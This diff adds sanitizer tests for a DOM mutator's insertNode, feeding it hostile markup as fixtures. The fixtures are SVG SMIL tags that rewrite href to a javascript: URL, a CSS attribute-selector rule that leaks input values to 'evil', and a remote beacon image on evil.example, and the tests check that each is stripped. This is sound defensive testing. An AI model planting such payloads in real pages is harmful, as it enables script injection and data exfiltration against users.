@@ -400,3 +400,47 @@ describe('structural undo under page churn (#58 review)', () => {
     expect(one.nextSibling).toBe(two);
   });
 });
+
+describe('insertNode sanitizer residuals (#144 round-3 review)', () => {
+  it('drops SMIL animation tags (they can rewrite href to javascript: AFTER insertion)', () => {
+    mount('<div id="host"></div>');
+    createMutator(document).insertNode(
+      byId('host'),
+      '<svg id="s" viewBox="0 0 10 10"><a href="?"><animate attributeName="href" values="javascript:alert(1)"/>' +
+        '<set attributeName="href" to="javascript:alert(1)"/><circle r="2">' +
+        '<animateMotion path="M0,0 L1,1"/><animateTransform attributeName="transform"/>' +
+        '</circle></svg>',
+      'beforeend',
+    );
+    const svg = document.getElementById('s');
+    expect(svg).not.toBeNull(); // the SVG itself is legit design markup
+    for (const tag of ['animate', 'set', 'animateMotion', 'animateTransform'])
+      expect(svg?.querySelector(tag), tag).toBeNull();
+  });
+
+  it("drops <style> elements (page-wide CSS is beyond setStyle's scoped grant)", () => {
+    mount('<div id="host"></div>');
+    createMutator(document).insertNode(
+      byId('host'),
+      '<p id="ok" style="color: red">ok</p><style>input[value^="a"]{background:url(//evil/a)}</style>',
+      'beforeend',
+    );
+    expect(document.getElementById('ok')).not.toBeNull();
+    expect(document.getElementById('ok')?.getAttribute('style')).toBe('color: red'); // inline style stays
+    expect(document.querySelector('style')).toBeNull();
+  });
+
+  it('refuses remote http(s) href on SVG image/use, keeps data: and fragment refs', () => {
+    mount('<div id="host"></div>');
+    createMutator(document).insertNode(
+      byId('host'),
+      '<svg><image id="img" href="https://evil.example/beacon.png"/>' +
+        '<image id="img2" href="data:image/png;base64,AAA"/>' +
+        '<use id="u" href="#local-shape"/></svg>',
+      'beforeend',
+    );
+    expect(document.getElementById('img')?.getAttribute('href')).toBeNull();
+    expect(document.getElementById('img2')?.getAttribute('href')).toBe('data:image/png;base64,AAA');
+    expect(document.getElementById('u')?.getAttribute('href')).toBe('#local-shape');
+  });
+});
